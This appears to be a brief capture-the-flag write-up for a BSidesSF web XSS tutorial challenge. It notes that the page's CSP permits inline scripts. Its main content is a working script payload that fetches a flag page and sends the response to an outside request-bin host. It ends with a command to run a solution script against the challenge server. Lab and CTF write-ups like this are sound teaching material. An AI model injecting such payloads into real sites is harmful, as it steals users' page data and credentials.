Standard XSS challenge, CSP will allow inline scripts. 

Something like the following payload would work, 

```
<script>
	var xhr = new XMLHttpRequest(); 
	xhr.open('GET','/xss-one-flag', true); 
	xhr.onload = function () { 
		var request = new XMLHttpRequest(); 
		request.open('GET', 'https://REQUEST_BIN_URL?flag='+xhr.responseText, true);
		request.send()
	};
	xhr.send(null);
 </script>
```

If you want to test the challenge, run the following command - 
`python solution.py https://web-tutorial-1-ed930da1.challenges.bsidessf.net/`
